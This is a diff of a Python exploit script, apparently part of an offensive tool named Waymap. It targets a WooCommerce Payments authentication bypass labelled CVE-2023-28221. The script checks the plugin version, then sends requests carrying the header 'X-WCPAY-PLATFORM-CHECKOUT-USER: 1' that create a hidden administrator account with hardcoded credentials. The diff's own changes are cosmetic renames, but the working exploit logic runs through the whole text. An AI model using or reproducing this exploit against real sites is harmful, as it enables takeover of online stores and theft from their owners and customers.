@@ -13,10 +13,10 @@ username = "waymap_admin"
 password = "TrixSecSecure123!"
 email = "admin@waymap.com"
 
-def verify_woocommerce_version(target):
+def verify_woocommerce_version(profile_url):
     print(Style.RESET_ALL + "Checking WooCommerce Payments version:", end=' ')
     try:
-        r = requests.get(f"{target}/wp-content/plugins/woocommerce-payments/readme.txt", verify=False)
+        r = requests.get(f"{profile_url}/wp-content/plugins/woocommerce-payments/readme.txt", verify=False)
         version = re.search(r"Stable tag: (.*)", r.text).groups()[0]
     except Exception as e:
         print(Fore.RED + f'Error... {e}')
@@ -28,7 +28,7 @@ def verify_woocommerce_version(target):
         print(Fore.RED + f'{version} - Not vulnerable To CVE-2023-28221')
         exit()
 
-def create_waymap_admin(target):
+def create_waymap_admin(profile_url):
     headers = {
         'User-Agent': 'Waymap Offensive Agent',
         'X-WCPAY-PLATFORM-CHECKOUT-USER': '1'
@@ -45,18 +45,18 @@ def create_waymap_admin(target):
     print(Style.RESET_ALL + "Starting session:", end=' ')
     s = requests.Session()
     try:
-        r = s.get(f'{target}', headers=headers, verify=False)
+        r = s.get(f'{profile_url}', headers=headers, verify=False)
         print(Fore.GREEN + f'done')
     except Exception as e:
         print(Fore.RED + f'Error... {e}')
         exit()
 
     print(Style.RESET_ALL + "Adding Waymap admin user:", end=' ')
-    r = s.post(f'{target}', data=data, headers=headers, verify=False)
+    r = s.post(f'{profile_url}', data=data, headers=headers, verify=False)
     if r.status_code == 201:
         print(Fore.GREEN + f'done')
     else:
-        print(Fore.RED + f'Cannot Create Waymap Admin Looks Like target Is Not Vulnerable {r.status_code}')
+        print(Fore.RED + f'Cannot Create Waymap Admin Looks Like Target Is Not Vulnerable {r.status_code}')
         exit()
 
     print(Style.RESET_ALL + "Success! You can now log in with the following credentials:")
